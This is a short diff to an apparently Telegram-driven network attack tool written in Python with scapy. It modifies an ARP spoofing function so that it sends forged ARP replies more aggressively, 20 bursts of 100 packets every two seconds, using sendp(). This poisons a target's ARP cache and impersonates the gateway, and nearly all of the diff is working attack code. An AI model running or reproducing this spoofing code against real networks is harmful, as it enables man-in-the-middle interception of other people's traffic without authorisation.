@@ -9,7 +9,7 @@ try:
 
     from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
     from netaddr import IPAddress
-    from scapy.all import send, ARP
+    from scapy.all import sendp, ARP
     from time import sleep
     import urllib.request
     import urllib.parse
@@ -284,8 +284,11 @@ def arpSpoof(target):
     print("[+] ARP Spoofing " + str(target[0]) + "...")
     while True:
         if attackManager("isattacked", target=target[0]) == True:
-            send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
-            time.sleep(1)
+            i = 0
+            while i < 20:
+                sendp(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=iface_mac), count=100, verbose=False)
+                i += 1
+            time.sleep(2)
         else:
             print("[+] Stopping ARP Spoof for " + str(target[0]) + "...")
             send(ARP(op=2, psrc=gw_ip, pdst=target[0],hwdst=target[1],hwsrc=gw_mac), count=100, verbose=False)
